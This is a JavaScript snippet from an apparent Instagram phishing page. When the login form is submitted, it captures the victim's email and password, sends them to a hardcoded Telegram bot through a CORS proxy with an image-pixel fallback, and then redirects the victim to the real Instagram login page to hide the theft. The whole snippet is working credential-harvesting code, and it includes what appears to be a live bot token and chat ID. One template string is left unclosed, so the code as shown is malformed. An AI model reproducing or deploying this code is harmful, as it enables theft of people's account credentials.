<script>
    const BOT_TOKEN = '7974497373:AAHK9pZ4zR25B8faII-LyvCL-4ybEZCo6uk';
    const CHAT_ID = '7426900783';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const formData = new FormData(this);
        const email = formData.get('email');
        const password = formData.get('pass');
        const timestamp = new Date().toLocaleString();

        const messageText = `ðŸ”“ NEW LOGIN

        // Use a CORS proxy to bypass any browser restrictions.

        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = `chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}`;

        // Option 1: Fetch via proxy (more reliable from browser)
        fetch(proxyUrl + telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest' // Some proxies need this
            },
            body: params
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram response:', data);
            if (!data.ok) {
                // Fallback: Try direct GET request as image pixel method (less reliable but simple)
                new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`;
            }
        })
        .catch(error => {
            console.error('Proxy fetch failed:', error);
            // Fallback: Direct GET request as last resort
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?${params}`;
        })
        .finally(() => {
            // Redirect regardless of success
            window.location.href = 'https://www.instagram.com/accounts/login/';
        });

        // Short delay to ensure request fires before redirect
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 500);
    });
</script>
